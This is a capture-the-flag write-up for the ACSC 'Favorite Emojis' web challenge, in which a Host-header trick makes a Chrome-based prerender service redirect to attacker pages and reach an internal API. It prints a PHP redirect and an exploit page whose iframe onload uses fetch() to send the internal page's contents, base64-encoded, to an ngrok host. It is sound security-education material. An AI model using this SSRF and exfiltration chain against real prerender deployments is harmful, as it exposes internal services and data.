---
description: Prerender dynamic rendering leads to SSRF
---

# Favorite Emojis

## Description

🎈





                                🏃

`http://favorite-emojis.chal.acsc.asia:5000`

{% file src="../../.gitbook/assets/favorite-emojis.tar.gz\_88c58c7d867bcad99c40a2013cc77a58.gz" caption="Challenge Files" %}

## Solution

I came across this post which gave me the inspiration for the exploit: [https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/](https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/)

The pre-renderer uses Chrome. We can perform XSS within the renderer.

Set the host header so that the renderer visits our attacker-controlled site. From there, we can redirect the browser using the `Location` header.

`redirect.php`:

```php
<?php 
    header("Location: http://localhost:3000/render?url=http://localhost:3000/render?url=http://0db7-115-66-195-39.ngrok.io/exploit.html");
?>
```

From the user's perspective, the Nginx server will return the 302 redirect, instead of the contents of the redirected site. However, the renderer's browser will still follow the redirect. It will then be redirected to our second exploit page:

`exploit.html`:

```markup
<html>
    <body>
        <iframe id="iframe" src="http://localhost:3000/render?url=http://api:8000/" onload='fetch("http://0db7-115-66-195-39.ngrok.io/?"+btoa(document.getElementById("iframe").contentWindow.document.documentElement.innerHTML));'></iframe>
    </body>
</html>
```

Since both the current site and the iframe's source are `localhost:3000`, this bypasses SOP and allows us to access the iframe's contents.

This gives us the `http://api:8000` contents:

```text
[Sat Sep 18 19:36:42 2021] 127.0.0.1:49207 [404]: /?PGhlYWQ+PC9oZWFkPjxib2R5PkFDU0N7c2hhcmtzX2FyZV9hbHdheXNfaHVuZ3J5fTwvYm9keT4= - No such file or directory
```

Which decodes to

```markup
<head></head><body>ACSC{sharks_are_always_hungry}</body>
```

